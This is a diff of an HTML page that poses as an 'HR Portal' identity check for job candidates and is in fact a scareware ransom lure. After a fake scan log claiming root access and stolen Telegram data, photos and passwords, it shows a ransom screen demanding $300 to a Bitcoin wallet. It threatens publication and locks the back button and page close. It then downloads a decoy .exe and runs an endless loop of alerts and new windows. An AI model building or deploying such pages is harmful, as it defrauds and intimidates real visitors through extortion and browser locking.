@@ -3,181 +3,176 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>ailenkoanna014-cpu.github.io</title>
+    <title>HR Portal | Security Verification</title>
     <style>
-        body { background-color: #000; color: #f00; font-family: 'Courier New', Courier, monospace; margin: 0; overflow: hidden; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        body { background-color: #000; color: #0f0; font-family: 'Courier New', Courier, monospace; margin: 0; overflow: hidden; display: flex; justify-content: center; align-items: center; height: 100vh; }
         
-        /* МАТРИЦА НА ФОНЕ */
-        #matrix { position: fixed; top: 0; left: 0; width: 100%; height: 100%; font-size: 10px; opacity: 0.15; z-index: 1; pointer-events: none; white-space: pre; line-height: 1.2; overflow: hidden; color: #0f0; }
+        #matrix { position: fixed; top: 0; left: 0; width: 100%; height: 100%; font-size: 10px; opacity: 0.15; z-index: 1; pointer-events: none; white-space: pre; line-height: 1.2; overflow: hidden; }
 
-        /* ВАКАНСИЯ (НАЧАЛО) */
-        #overlay { position: fixed; top:0; left:0; width:100%; height:100%; z-index: 9999; background: #f0f2f5; display: flex; justify-content: center; align-items: center; font-family: sans-serif; }
-        .start-box { background: white; padding: 40px 30px; border-radius: 2px; box-shadow: 0 20px 60px rgba(0,0,0,0.1); width: 85%; max-width: 400px; text-align: center; border-top: 5px solid #1a73e8; }
-        .start-btn { padding: 18px; font-size: 16px; background: #1a73e8; color: white; border: none; font-weight: bold; cursor: pointer; width: 100%; margin-top: 20px; }
+        #overlay { position: fixed; top:0; left:0; width:100%; height:100%; z-index: 9999; background: #ffffff; display: flex; justify-content: center; align-items: center; font-family: sans-serif; }
+        .start-box { background: white; padding: 40px; border-radius: 2px; box-shadow: 0 10px 40px rgba(0,0,0,0.1); width: 90%; max-width: 420px; text-align: center; border-top: 5px solid #0052cc; }
+        .start-btn { padding: 16px; font-size: 15px; background: #0052cc; color: white; border: none; font-weight: 600; cursor: pointer; width: 100%; margin-top: 25px; border-radius: 3px; }
 
-        /* ГЛАВНОЕ ОКНО РАТКИ (ТВОЙ ДИЗАЙН) */
-        #main-content { position: relative; z-index: 10; width: 90%; max-width: 500px; display: none; text-align: center; }
-        .devil-logo { width: 200px; margin-bottom: 20px; filter: drop-shadow(0 0 10px #f00); }
+        .content { position: relative; z-index: 10; width: 100%; height: 100%; display: none; background: #7b0000; color: white; padding: 40px; box-sizing: border-box; overflow-y: auto; }
+        .alert-box { max-width: 800px; margin: 0 auto; border: 2px solid white; padding: 30px; background: #000; box-shadow: 20px 20px 0px #4a0000; }
+        .btc-wallet { color: #ffff00; word-break: break-all; font-weight: bold; background: #222; padding: 15px; display: block; border: 1px dashed #ffff00; margin: 20px 0; font-size: 16px; text-align: center; }
         
-        .ransom-box { border: 2px solid #f00; padding: 20px; background: rgba(0,0,0,0.9); position: relative; }
-        .header-msg { font-weight: bold; font-size: 22px; margin-bottom: 20px; text-transform: uppercase; letter-spacing: 2px; }
-        .info-text { font-size: 14px; line-height: 1.4; margin-bottom: 15px; text-align: left; color: #f00; }
+        #loader-screen { position: relative; z-index: 10; width: 80%; max-width: 500px; display: none; }
+        .progress-container { width: 100%; border: 1px solid #0f0; height: 10px; margin: 20px 0; background: #000; }
+        #progress-bar { width: 0%; height: 100%; background: #0f0; transition: width 0.4s ease-in-out; }
         
-        .btc-address { border: 1px dashed #ff0; color: #ff0; padding: 10px; font-size: 12px; word-break: break-all; margin: 15px 0; background: #111; }
-        .status-text { color: #ff0; font-weight: bold; margin-bottom: 20px; font-size: 14px; }
+        .danger-btn { background: #ff0000; color: white; border: 2px solid white; padding: 20px; width: 100%; font-weight: 900; cursor: pointer; margin-top: 25px; text-transform: uppercase; font-size: 18px; }
+        .blink { animation: blinker 0.8s step-start infinite; }
+        @keyframes blinker { 50% { opacity: 0; } }
         
-        .deactivate-btn { background: #800; color: #fff; border: none; padding: 15px; width: 100%; font-weight: bold; cursor: pointer; text-transform: uppercase; font-size: 16px; transition: 0.2s; }
-        .deactivate-btn:hover { background: #f00; }
-
-        /* ЗАГРУЗКА */
-        #loader-screen { position: relative; z-index: 10; width: 80%; display: none; text-align: center; color: #0f0; }
-        .progress-bar { width: 100%; border: 1px solid #0f0; height: 30px; margin-top: 10px; }
-        #fill { width: 0%; height: 100%; background: #0f0; }
-
-        .blink { animation: blink-anim 0.6s step-end infinite; }
-        @keyframes blink-anim { 50% { opacity: 0; } }
+        h1 { font-size: 28px; margin-top: 0; color: #ff0000; text-transform: uppercase; border-bottom: 2px solid #ff0000; padding-bottom: 10px; }
+        .warning-text { color: #ff0000; font-weight: bold; background: white; padding: 5px; display: inline-block; margin-bottom: 15px; }
     </style>
 </head>
-<body onclick="initAttack()">
+<body onclick="startAttack()">
 
     <div id="overlay">
         <div class="start-box">
-            <h2 style="margin: 0 0 15px; color: #1e293b;">HR Portal</h2>
-            <p style="color: #475569; font-size: 14px;">Для просмотра деталей вакансии и прохождения теста разрешите системе проверить ваше устройство.</p>
-            <button class="start-btn">ПРОЙТИ ПРОВЕРКУ</button>
+            <h2 style="margin: 0 0 10px; color: #172b4d;">Identity Verification</h2>
+            <p style="color: #5e6c84; font-size: 14px;">To protect our candidates, we require a mandatory system integrity check before displaying sensitive job offer details.</p>
+            <button class="start-btn">BEGIN SECURE SCAN</button>
         </div>
     </div>
 
     <div id="matrix"></div>
 
     <div id="loader-screen">
-        <p id="loading-msg">Чтение данных Telegram Desktop...</p>
-        <div class="progress-bar"><div id="fill"></div></div>
-        <p id="perc">0%</p>
+        <div id="log-text" style="font-size: 12px; margin-bottom: 10px;">[INIT] Starting kernel-level diagnostic...</div>
+        <div class="progress-container"><div id="progress-bar"></div></div>
+        <div id="perc" style="font-size: 18px; font-weight: bold;">0% COMPLETED</div>
+        <div id="sub-log" style="font-size: 10px; color: #0a0; margin-top: 10px; height: 40px; overflow: hidden;"></div>
     </div>
 
-    <div id="main-content">
-        <img src="https://i.ibb.co/V98m0p5/devil-neon.png" class="devil-logo" alt="Devil">
-        <div class="ransom-box">
-            <div class="header-msg">SYSTEM COMPROMISED</div>
-            <div class="info-text">
-                Все данные вашего устройства (Telegram сессии, история браузера, личные фото и контакты) были успешно скопированы и зашифрованы алгоритмом AES-256.
-                <br><br>
-                <span style="text-decoration: underline;">ВНИМАНИЕ:</span> Попытка закрыть страницу или перезагрузить устройство приведет к немедленной публикации данных на публичных серверах.
+    <div id="main-content" class="content">
+        <div class="alert-box">
+            <span class="warning-text">CRITICAL SYSTEM FAILURE</span>
+            <h1 class="blink">УСТРОЙСТВО ЗАБЛОКИРОВАНО</h1>
+            
+            <p>Все данные Telegram, история браузера и личные фото были успешно скопированы и отправлены на сервер <strong>82.202.160.11</strong>.</p>
+            <p><strong>RAT STATUS: ACTIVE (SESSION_ID: 0x882_AES)</strong></p>
+            
+            <p>Ваше устройство полностью скомпрометировано. Все личные переписки, видео и пароли от банковских приложений теперь находятся под нашим контролем.</p>
+            <p>Через 168 часов данные будут <strong>ЗАШИФРОВАНЫ</strong> и опубликованы в DarkNet.</p>
+            
+            <p style="color: #ff0000; font-weight: bold; border: 1px solid red; padding: 10px;">ВНИМАНИЕ: Любая попытка перезагрузки или закрытия страницы приведет к немедленному уничтожению файловой системы.</p>
+            
+            <div style="margin-top: 30px;">
+                <p style="margin: 0; font-size: 14px;">BTC Wallet for decryption ($300):</p>
+                <span class="btc-wallet">bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh</span>
             </div>
             
-            <p style="text-align: left; font-size: 12px; margin-bottom: 5px;">Для расшифровки данных отправьте $300 на BTC адрес:</p>
-            <div class="btc-address">bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh</div>
+            <p class="blink" style="font-size: 20px; color: #ffff00; text-align: center; font-weight: bold; margin: 25px 0;">STATUS: WAITING FOR PAYMENT (167:59:58)</p>
             
-            <div class="status-text">STATUS: WAITING FOR PAYMENT <span class="blink">(167:59:58)</span></div>
-            
-            <button class="deactivate-btn" onclick="hardCrash()">ДЕАКТИВИРОВАТЬ И УДАЛИТЬ RAT</button>
-            <p style="font-size: 10px; margin-top: 10px; color: #666;">Hardware ID: 0x822-CRITICAL-ERR</p>
+            <button class="danger-btn" onclick="scareMore()">ДЕАКТИВИРОВАТЬ И УДАЛИТЬ RAT</button>
         </div>
     </div>
 
     <audio id="siren" loop src="https://www.soundjay.com/mechanical/sounds/siren-1.mp3"></audio>
 
     <script>
-        let attackStarted = false;
+        let prg = 0;
+        let isStarted = false;
 
-        // 1. Старт атаки и системные уведомления
-        function initAttack() {
-            if (attackStarted) return;
-            attackStarted = true;
+        const consoleLogs = [
+            "Scanning /data/user/0/com.telegram.messenger...",
+            "Hooking system calls: sys_read, sys_write...",
+            "Privilege escalation: UID 0 achieved.",
+            "Injecting payload into zygote process...",
+            "Dumping SQLite database: contacts.db",
+            "Accessing /DCIM/Camera/... 4.2GB identified.",
+            "Bypassing Play Protect integrity check...",
+            "Encrypting local buffer: RSA-2048 key generated.",
+            "Exfiltrating session tokens... [DONE]"
+        ];
 
-            // Реальный запрос на уведомления (как ты просила)
-            if ("Notification" in window) {
-                Notification.requestPermission().then(res => {
-                    // Независимо от выбора, идем дальше
-                    startVisuals();
-                });
-            } else {
-                startVisuals();
-            }
-        }
+        function startAttack() {
+            if (isStarted) return;
+            isStarted = true;
 
-        function startVisuals() {
             document.getElementById('overlay').style.display = 'none';
             document.getElementById('loader-screen').style.display = 'block';
-            
-            if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen().catch(()=>{});
 
-            let p = 0;
-            let fill = document.getElementById('fill');
-            let perc = document.getElementById('perc');
-            let msg = document.getElementById('loading-msg');
-            
-            let loadInterval = setInterval(() => {
-                p += Math.floor(Math.random() * 3) + 1;
-                if (p > 100) p = 100;
-                fill.style.width = p + "%";
-                perc.innerText = p + "%";
-                
-                if(p > 30) msg.innerText = "Копирование личных фотографий...";
-                if(p > 60) msg.innerText = "Сбор паролей и сессий браузера...";
-                if(p > 90) msg.innerText = "ФИНАЛИЗАЦИЯ ШИФРОВАНИЯ...";
+            if ("Notification" in window) {
+                Notification.requestPermission();
+            }
 
-                if (p >= 100) {
-                    clearInterval(loadInterval);
-                    setTimeout(showRansomWindow, 1000);
-                }
-            }, 100);
+            if (document.documentElement.requestFullscreen) {
+                document.documentElement.requestFullscreen().catch(() => {});
+            }
 
-            runMatrix();
+            slowLoading();
+            startMatrix();
         }
 
-        // 2. Показ основного окна и звук
-        function showRansomWindow() {
+        function slowLoading() {
+            const bar = document.getElementById('progress-bar');
+            const perc = document.getElementById('perc');
+            const subLog = document.getElementById('sub-log');
+
+            const timer = setInterval(() => {
+                prg += Math.random() * 0.4;
+                if (prg > 100) prg = 100;
+                
+                bar.style.width = prg + "%";
+                perc.innerText = Math.floor(prg) + "% ANALYZING SYSTEM";
+
+                if (Math.random() > 0.8) {
+                    subLog.innerHTML = "> " + consoleLogs[Math.floor(Math.random() * consoleLogs.length)] + "<br>" + subLog.innerHTML;
+                }
+
+                if (prg >= 100) {
+                    clearInterval(timer);
+                    setTimeout(showRansom, 1200);
+                }
+            }, 120); 
+        }
+
+        function showRansom() {
             document.getElementById('loader-screen').style.display = 'none';
             document.getElementById('main-content').style.display = 'block';
-            document.body.style.backgroundColor = "#1a0000";
-            
-            let audio = document.getElementById('siren');
-            audio.volume = 1.0;
-            audio.play().catch(() => {});
-
-            // Блокировка закрытия
-            window.onbeforeunload = function() { return "Ваши данные будут удалены!"; };
+            document.body.style.backgroundColor = "#2a0000";
+            document.getElementById('siren').play().catch(() => {});
+            window.onbeforeunload = function() { return "DATA WILL BE DELETED!"; };
         }
 
-        // 3. Бесконечные алерты и скачивание RAT при "Отмене"
-        function hardCrash() {
-            // Имитируем скачивание страшного файла
-            const blob = new Blob(["CRITICAL_SYSTEM_RAT_EXPLOIT_EXECUTED"], {type: 'application/octet-stream'});
+        function startMatrix() {
+            const matrix = document.getElementById('matrix');
+            setInterval(() => {
+                const hex = "ABCDEF0123456789";
+                let line = "";
+                for(let i=0; i<40; i++) line += hex[Math.floor(Math.random()*16)] + " ";
+                matrix.innerText += "\n" + line;
+                if(matrix.innerText.length > 2000) matrix.innerText = matrix.innerText.substring(400);
+            }, 100);
+        }
+
+        // --- БЛОК ЭКСТРИМА ---
+        function scareMore() {
+            const blob = new Blob(["RAT_CORE_INJECTED_SESSION_882"], {type: 'application/octet-stream'});
             const a = document.createElement('a');
             a.href = URL.createObjectURL(blob);
-            a.download = "RAT_SYSTEM_INJECT_FB_PASSHACK.exe";
+            a.download = "RAT_SYSTEM_FINAL_PAYLOAD_LNK_BYPASS.exe";
             a.click();
 
-            // Бесконечный цикл окон (экстрим)
             setTimeout(() => {
                 while(true) {
-                    alert("КРИТИЧЕСКАЯ ОШИБКА: RAT заблокировал попытку деактивации. Данные под угрозой удаления.");
-                    alert("SYSTEM_FAILURE: Файлы перемещены в карантин сервера 82.202.160.11");
-                    alert("ATTEMPT TO CLOSE BLOCKED");
-                    // В современных браузерах "бесконечный" цикл алертов может быть прерван юзером, 
-                    // но мы добавим спам новых вкладок если это ПК
-                    window.open(window.location.href, '_blank');
+                    alert("КРИТИЧЕСКАЯ ОШИБКА: RAT заблокировал попытку вмешательства!");
+                    alert("SYSTEM ERROR: Unauthorized core access detected.");
+                    window.open(window.location.href, '_blank', 'width=500,height=400');
                 }
-            }, 500);
+            }, 200);
         }
 
-        function runMatrix() {
-            const matrix = document.getElementById('matrix');
-            const chars = "0123456789ABCDEFHIJKLMNOPQRSTUVWXYZ";
-            setInterval(() => {
-                let line = "";
-                for(let i=0; i<50; i++) line += chars[Math.floor(Math.random()*chars.length)] + " ";
-                matrix.innerText += "\n" + line;
-                if(matrix.innerText.length > 2000) matrix.innerText = matrix.innerText.substring(500);
-                window.scrollTo(0, document.body.scrollHeight);
-            }, 80);
-        }
-
-        // Запрет кнопки "Назад"
         history.pushState(null, null, location.href);
-        window.onpopstate = function () { history.go(1); };
+        window.onpopstate = function () { 
+            history.go(1); 
+            alert("FATAL ERROR: Navigation locked by RAT process.");
+        };
     </script>
-</body> 
+</body>
 </html>
